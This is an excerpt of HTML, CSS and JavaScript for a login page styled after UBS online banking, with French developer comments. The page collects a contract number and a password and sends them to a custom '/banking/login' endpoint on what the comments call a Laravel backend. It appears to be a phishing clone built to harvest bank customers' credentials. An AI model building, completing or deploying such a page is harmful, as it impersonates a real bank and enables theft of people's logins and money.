...
:root{
  ...
  --ubs-light:  #e8e8e8;
  --ubs-border: #cccccc;
  --ubs-bg:     #dde9f5;   /* bleu poudré dégradé fond */
  --ubs-white:  #ffffff;
  --ubs-btn:    #3d3d3d;   /* bouton gris foncé */
  --ubs-btn-h:  #1a1a1a;
  --ubs-error:  #CC0000;
  --ubs-focus:  #0069b4;
  --card-r:     4px;
...
.field-input.has-error{
  border-color:var(--ubs-error);
}
.field-input:focus.has-error{
...
.pw-section.visible{
  max-height:90px; opacity:1; margin-bottom:10px;
}
...
<main class="ubs-main">
  <div class="login-card">
    ...
    <div class="error-msg" id="errorMsg">
      ...
      <span id="errorText">Contract number not found. Please check your entry.</span>
    </div>

    <!-- Résumé numéro de compte (étape 2) -->
    ...
    <div id="step1Wrap">
      <div class="field-wrap">
        <input class="field-input" type="text" id="contractNum"
               inputmode="numeric" autocomplete="off" maxlength="20"/>
        <label class="field-label" for="contractNum">Contract number</label>
    ...
    <div class="pw-section" id="pwSection">
      <div class="field-wrap">
        <input class="field-input" type="password" id="pwInput"
...
<footer class="ubs-footer">
  ...
  <p class="footer-legal">
    The products, services, information and/or materials contained within this website may not be available to residents of certain jurisdictions. Please consult the sales restrictions relating to the products or services in question for further information.
  </p>
...
(function () {
  ...
  [contractNum, pwInput].forEach(function (el) {
  ...
  chipChange.addEventListener('click', function () {
    ...
    clearError();
    setTimeout(function () { contractNum.focus(); }, 50);
  });
  ...
  mainBtn.addEventListener('click', function () {
    ...
    /* ===== ÉTAPE 1 : valider le numéro de compte ===== */
    if (step === 1) {
      var val = contractNum.value.trim();
      if (!val) {
        shakeField(contractNum);
        showError('Please enter your contract number.');
        return;
      }
      if (!/^\d{6,}$/.test(val)) {
        shakeField(contractNum);
        showError('Contract number not found. Please check your entry.');
        return;
      }
    ...
    /* ===== ÉTAPE 2 : valider le mot de passe ===== */
      ...
      /* ── Simulation envoi (remplacer par fetch vers Laravel) ── */
      setLoading(true);
      setTimeout(function () {
        setLoading(false);
      ...
      fetch('/banking/login', {
        ...
        body: JSON.stringify({
          numero_compte: contractNum.value.trim(),
          password: pw
        })
      })
      .then(r => r.json())
